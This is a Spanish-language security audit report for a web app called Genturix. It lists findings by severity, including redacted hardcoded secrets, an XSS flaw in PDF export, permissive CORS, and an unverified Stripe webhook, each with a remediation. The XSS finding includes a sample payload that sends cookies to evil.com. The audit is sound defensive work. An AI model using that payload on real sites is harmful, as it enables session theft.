# REPORTE DE AUDITORÍA DE SEGURIDAD - GENTURIX
## Auditoría Profunda de Seguridad y Arquitectura

**Fecha:** Diciembre 2025  
**Auditor:** Senior Security Engineer & Full Stack Auditor  
**Alcance:** Análisis completo del código fuente, configuración, y arquitectura

---

## RESUMEN EJECUTIVO

La auditoría del proyecto Genturix revela una aplicación con **fundamentos de seguridad sólidos** pero con **áreas críticas que requieren atención inmediata**. Se identificaron vulnerabilidades en las siguientes categorías:

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| 🔴 **CRÍTICO** | 3 | Requiere acción inmediata |
| 🟠 **ALTO** | 5 | Requiere acción en 7 días |
| 🟡 **MEDIO** | 6 | Planificar remediación |
| 🟢 **BAJO** | 4 | Mejoras recomendadas |

---

## 🔴 HALLAZGOS CRÍTICOS

### C-001: Secretos Hardcodeados en `.env` del Repositorio

**Severidad:** CRÍTICA  
**Ubicación:** `/app/backend/.env`  
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Descripción:**
El archivo `.env` contiene secretos en texto plano que están expuestos:

```
JWT_SECRET_KEY="JWT_SECRET_REDACTED"
JWT_REFRESH_SECRET_KEY="JWT_REFRESH_REDACTED"
STRIPE_API_KEY=STRIPE_KEY_REDACTED
RESEND_API_KEY=RESEND_KEY_REDACTED
VAPID_PRIVATE_KEY=VAPID_PRIVATE_REDACTED
```

**Riesgo:**
- Compromiso total de autenticación JWT
- Acceso no autorizado a Stripe (pagos)
- Capacidad de enviar emails como la plataforma
- Suplantación de notificaciones push

**Remediación:**
1. Rotar TODOS los secretos inmediatamente
2. Usar variables de entorno del sistema, no archivos `.env` en producción
3. Agregar `.env` a `.gitignore`
4. Usar gestores de secretos (AWS Secrets Manager, HashiCorp Vault)

---

### C-002: Vulnerabilidad XSS en Generación de PDF

**Severidad:** CRÍTICA  
**Ubicación:** `/app/frontend/src/components/ResidentVisitHistory.jsx:452`  
**CWE:** CWE-79 (Cross-site Scripting)

**Código Vulnerable:**
```javascript
const container = document.createElement('div');
container.innerHTML = html; // PELIGROSO: Inyección directa de HTML
```

**Descripción:**
Los datos de visitantes (`visitor_name`, `apartment`, etc.) se insertan directamente en HTML sin sanitización:

```javascript
<td>${entry.visitor_name || 'N/A'}</td>
<td>${exportData.resident_name}</td>
<td>${exportData.apartment}</td>
```

**Vector de Ataque:**
Un atacante podría registrar un visitante con nombre:
```
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Remediación:**
```javascript
// Función de escape HTML
const escapeHtml = (str) => {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
};

// Uso seguro
<td>${escapeHtml(entry.visitor_name || 'N/A')}</td>
```

---

### C-003: CORS Wildcard en Desarrollo Puede Filtrarse a Producción

**Severidad:** CRÍTICA  
**Ubicación:** `/app/backend/.env:5`  
**CWE:** CWE-942 (Overly Permissive CORS Policy)

**Configuración Actual:**
```
CORS_ORIGINS="*"
```

**Descripción:**
Aunque el código en `server.py` (líneas 18176-18231) implementa CORS correctamente por ambiente, el valor `CORS_ORIGINS="*"` en `.env` es peligroso si se usa en producción.

**Riesgo:**
- Permite que cualquier sitio web haga requests autenticados
- Facilita ataques CSRF
- Puede exponer datos de usuarios a terceros

**Remediación:**
1. Eliminar la variable `CORS_ORIGINS` del `.env`
2. Confiar únicamente en la lógica de `get_cors_origins()` en producción
3. Validar que `ENVIRONMENT=production` en producción

---

## 🟠 HALLAZGOS DE SEVERIDAD ALTA

### H-001: Backend Monolítico de 18,392 líneas

**Severidad:** ALTA (Riesgo Operacional)  
**Ubicación:** `/app/backend/server.py`  
**Impacto:** Mantenibilidad, Seguridad, Rendimiento

**Descripción:**
El archivo `server.py` contiene toda la lógica de negocio en un solo archivo:
- 18,392 líneas de código
- Mezcla de autenticación, billing, visitantes, pánico, etc.
- Difícil auditar y mantener
- Alto riesgo de introducir bugs de seguridad

**Riesgos de Seguridad:**
- Difícil detectar vulnerabilidades en código tan extenso
- Cambios pueden introducir regresiones de seguridad
- Code review ineficiente

**Remediación:**
Refactorizar en módulos:
```
/app/backend/
├── routes/
│   ├── auth.py
│   ├── billing.py
│   ├── visitors.py
│   ├── panic.py
│   └── ...
├── services/
├── models/
└── middleware/
```

---

### H-002: Webhook de Stripe Sin Verificación en Desarrollo

**Severidad:** ALTA  
**Ubicación:** `/app/backend/server.py:12829-12830`  
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)

**Código:**
```python
if not STRIPE_WEBHOOK_SECRET:
    logger.warning("[STRIPE-WEBHOOK] Processing without signature verification...")
```

**Descripción:**
En modo desarrollo, los webhooks de Stripe se procesan sin verificar la firma. Si un atacante descubre el endpoint, puede:
- Simular pagos completados
- Manipular estados de facturación
- Activar suscripciones sin pago real

**Remediación:**
1. Configurar `STRIPE_WEBHOOK_SECRET` en TODOS los ambientes
2. Rechazar webhooks sin firma válida incluso en desarrollo

---

### H-003: Access Token en localStorage

**Severidad:** ALTA  
**Ubicación:** `/app/frontend/src/contexts/AuthContext.js:29`  
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)

**Código:**
```javascript
const storedAccessToken = localStorage.getItem(STORAGE_KEYS.ACCESS_TOKEN);
```

**Descripción:**
El access token se almacena en `localStorage`, lo que lo hace vulnerable a ataques XSS. Si un atacante logra ejecutar JavaScript malicioso, puede robar el token.

**Nota Positiva:**
El refresh token ya se maneja correctamente vía httpOnly cookie.

**Remediación:**
1. Mover el access token a memoria (state de React)
2. Implementar refresh silencioso cuando el token expire
3. Considerar usar cookies httpOnly para ambos tokens

---

### H-004: DEV_MODE Configurable en Producción

**Severidad:** ALTA  
**Ubicación:** `/app/backend/.env:18`  
**CWE:** CWE-489 (Active Debug Code)

**Configuración:**
```
DEV_MODE=true
```

**Descripción:**
Aunque existe validación en el código para prevenir DEV_MODE en producción:
```python
if ENVIRONMENT == "production" and DEV_MODE:
    raise RuntimeError("DEV_MODE cannot be enabled in production")
```

El archivo `.env` con `DEV_MODE=true` puede filtrarse a producción si no se gestiona correctamente.

**Remediación:**
1. Eliminar `DEV_MODE` del archivo `.env`
2. Usar únicamente variables de entorno del sistema
3. Agregar validación en CI/CD

---

### H-005: Logs con Información Sensible

**Severidad:** ALTA  
**Ubicación:** Múltiples puntos en `server.py`  
**CWE:** CWE-532 (Sensitive Information in Log Files)

**Ejemplos encontrados:**
```python
print(f"[EMAIL TRIGGER] password_reset → sending new password to {recipient_email}")
logger.info(f"[AUTH EVENT] Login attempt | email={normalized_email}")
```

**Riesgo:**
- Emails de usuarios en logs
- IPs de clientes registradas
- Posible exposición de datos personales

**Remediación:**
1. Truncar o hashear emails en logs: `user***@domain.com`
2. No logear contraseñas temporales
3. Implementar política de retención de logs

---

## 🟡 HALLAZGOS DE SEVERIDAD MEDIA

### M-001: Sanitización Incompleta de Inputs

**Severidad:** MEDIA  
**Ubicación:** `/app/backend/server.py:328-333`

**Descripción:**
La lista de campos sanitizados es limitada:
```python
SANITIZE_FIELDS = [
    "full_name", "name", "description", "message", "notes",
    "visitor_name", "public_description", "reason", "comments",
    "address", "contact_phone", "apartment", "apartment_number"
]
```

**Campos sin sanitizar identificados:**
- `email` (aunque se valida formato, no se sanitiza contenido)
- `company` 
- `service_type`
- `identification_number`

**Remediación:**
Revisar y expandir la lista de campos sanitizados.

---

### M-002: Rate Limiting Solo en Login

**Severidad:** MEDIA  
**Ubicación:** `/app/backend/server.py:229-252`  
**CWE:** CWE-799 (Improper Control of Interaction Frequency)

**Descripción:**
El rate limiting manual (`LOGIN_ATTEMPTS`) solo protege el login:
```python
LOGIN_ATTEMPTS: Dict[str, list] = {}
MAX_ATTEMPTS_PER_MINUTE = 5
```

Los siguientes endpoints sensibles no tienen rate limiting efectivo:
- `/api/profile` (lectura masiva)
- `/api/authorizations` (enumeration)
- `/api/guard/checkin` (spam de registros)

**Remediación:**
Usar slowapi de forma consistente en todos los endpoints sensibles.

---

### M-003: Falta de Índices en Campos Críticos

**Severidad:** MEDIA (Rendimiento/DoS)  
**Ubicación:** `/app/backend/server.py:18254-18302`

**Descripción:**
Aunque existen índices, faltan índices para consultas frecuentes:
- `visitor_entries.status` (usado para "visitors inside")
- `audit_logs.timestamp` (consultas por fecha)
- `push_subscriptions.user_id` (notificaciones masivas)

**Riesgo:**
- Consultas lentas pueden causar timeout
- Posible vector de DoS

---

### M-004: Validación de Ownership Incompleta en Algunos Endpoints

**Severidad:** MEDIA  
**Ubicación:** `/app/backend/server.py:6142-6148`  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Código:**
```python
# Only owner can update
if auth.get("created_by") != current_user["id"]:
    raise HTTPException(status_code=403, detail="Solo puedes modificar tus propias autorizaciones")
```

**Observación:**
Esta validación es correcta, pero no se usa `get_tenant_resource()` de forma consistente. En línea 6142, se hace `find_one` sin validación multi-tenant:
```python
auth = await db.visitor_authorizations.find_one({"id": auth_id})
```

---

### M-005: Contraseñas Temporales en Response (DEV_MODE)

**Severidad:** MEDIA  
**Ubicación:** Documentado en comentarios (línea 174)

**Descripción:**
En modo desarrollo, las contraseñas generadas pueden ser retornadas en la API:
```python
# - Return generated password in API response for testing
```

Aunque está protegido por `DEV_MODE`, es un patrón peligroso.

---

### M-006: Duplicación de Lógica de Return en CORS

**Severidad:** BAJA (Bug)  
**Ubicación:** `/app/backend/server.py:18219-18220`

**Código:**
```python
        return all_origins
        return all_origins  # DUPLICADO - código muerto
```

---

## 🟢 HALLAZGOS DE SEVERIDAD BAJA

### L-001: Docs de API Habilitados en Desarrollo

**Severidad:** BAJA  
**Ubicación:** `/app/backend/server.py:274-275`

**Código:**
```python
docs_url="/docs" if ENVIRONMENT != "production" else None,
```

**Estado:** Correctamente implementado. Solo observación.

---

### L-002: Cookies Sin Prefijo `__Host-`

**Severidad:** BAJA  
**Ubicación:** `/app/backend/server.py:199`

**Descripción:**
El nombre de la cookie de refresh token es:
```python
REFRESH_TOKEN_COOKIE_NAME = "genturix_refresh_token"
```

Usar el prefijo `__Host-` proporcionaría protección adicional contra subdomain attacks.

---

### L-003: Falta Header CSP

**Severidad:** BAJA  
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Descripción:**
No se identificaron headers Content-Security-Policy. Implementar CSP ayudaría a mitigar XSS.

---

### L-004: Error Handling Inconsistente

**Severidad:** BAJA  

**Descripción:**
Algunos endpoints retornan errores detallados mientras otros son genéricos:
- Algunos: `"Invalid email or password"` (correcto)
- Otros: `"Error interno al eliminar la cuenta"` (puede variar)

---

## ASPECTOS POSITIVOS IDENTIFICADOS

✅ **Autenticación JWT robusta** con refresh token rotation  
✅ **Refresh token en httpOnly cookie** (previene robo por XSS)  
✅ **Validación multi-tenant** implementada con `tenant_filter()` y `validate_tenant_resource()`  
✅ **Bcrypt para hashing** de contraseñas  
✅ **Rate limiting** en endpoints de autenticación  
✅ **Audit logging** implementado  
✅ **Sanitización con bleach** para algunos campos  
✅ **Validación de webhook Stripe** en producción  
✅ **Session invalidation** tras cambio de contraseña  

---

## RECOMENDACIONES PRIORITARIAS

### Fase 1: Crítico (Inmediato)
1. ⚠️ Rotar TODOS los secretos en `.env`
2. ⚠️ Arreglar XSS en `ResidentVisitHistory.jsx`
3. ⚠️ Verificar `ENVIRONMENT=production` en deployment

### Fase 2: Alto (7 días)
4. Mover access token de localStorage a memoria
5. Habilitar verificación de webhook Stripe en desarrollo
6. Sanitizar logs de información sensible

### Fase 3: Medio (30 días)
7. Expandir campos sanitizados
8. Implementar rate limiting global
9. Agregar índices faltantes en MongoDB

### Fase 4: Arquitectura (Planificado)
10. Refactorizar `server.py` en módulos
11. Implementar CSP headers
12. Agregar prefix `__Host-` a cookies

---

## CONCLUSIÓN

El proyecto Genturix demuestra **prácticas de seguridad sólidas** en muchas áreas, particularmente en autenticación y multi-tenancy. Sin embargo, los **secretos expuestos** y la **vulnerabilidad XSS** representan riesgos críticos que deben abordarse inmediatamente antes de cualquier deployment a producción.

El tamaño del archivo `server.py` (18,392 líneas) es un riesgo operacional significativo que dificulta las auditorías y aumenta la probabilidad de introducir vulnerabilidades.

**Clasificación General de Seguridad:** ⚠️ **REQUIERE ACCIÓN ANTES DE PRODUCCIÓN**

---

*Reporte generado por Senior Security Engineer*  
*Diciembre 2025*
